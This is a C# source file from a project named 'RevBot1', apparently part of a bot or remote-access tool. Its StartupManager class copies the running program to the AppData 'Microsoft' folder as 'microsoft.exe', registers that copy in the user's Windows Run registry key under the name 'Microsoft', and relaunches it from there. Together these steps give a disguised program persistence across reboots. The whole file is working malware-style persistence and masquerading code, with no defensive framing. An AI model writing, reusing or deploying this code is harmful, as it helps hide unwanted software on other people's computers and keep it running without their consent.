using Microsoft.Win32;
using System;

using System.Diagnostics;
using System.IO;



namespace RevBot1
{



    public class StartupManager
    {

        static string install_folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "microsoft");
        static string curr_folder = AppDomain.CurrentDomain.BaseDirectory;
        public static void RunHidden()
        {
            Console.WriteLine("running hidden");

            string appDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string install_folder = Path.Combine(appDataFolder, "Microsoft");
            string newAppPath = Path.Combine(install_folder, "microsoft.exe");

            if (!IsProcessRunning(newAppPath))
            {
                Console.WriteLine("copying file");
                // Copiez le fichier vers le nouvel emplacement
                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, newAppPath, true);



                Console.WriteLine("adding to startup");
                // Ajoutez l'application au démarrage de Windows
                AddToStartup("Microsoft", newAppPath);

                Console.WriteLine("starting application");
                // Démarrer l'application depuis le nouvel emplacement

                Process.Start(newAppPath);
                Environment.Exit(0);
            }
        }

        private static bool IsProcessRunning(string path)
        {
            // Vérifiez si un processus utilise le fichier à partir de son chemin
            string fileName = Path.GetFileNameWithoutExtension(path);
            Process[] processes = Process.GetProcessesByName(fileName);
            foreach (Process process in processes)
            {
                if (process.MainModule.FileName.Equals(path, StringComparison.OrdinalIgnoreCase))
                {
                    return true;
                }
            }
            return false;
        }




        public static void AddToStartup(string appName, string appPath)
        {
            // La clé du registre pour les programmes de démarrage actuel de l'utilisateur
            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // Ajoutez votre application au démarrage en ajoutant une entrée dans le registre
            startupKey.SetValue(appName, appPath);

            // Fermez la clé du registre
            startupKey.Close();
        }

        public static void RemoveFromStartup(string appName)
        {
            // La clé du registre pour les programmes de démarrage actuel de l'utilisateur
            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // Supprimez votre application du démarrage en supprimant son entrée du registre
            startupKey.DeleteValue(appName, false);

            // Fermez la clé du registre
            startupKey.Close();
        }
    }
}
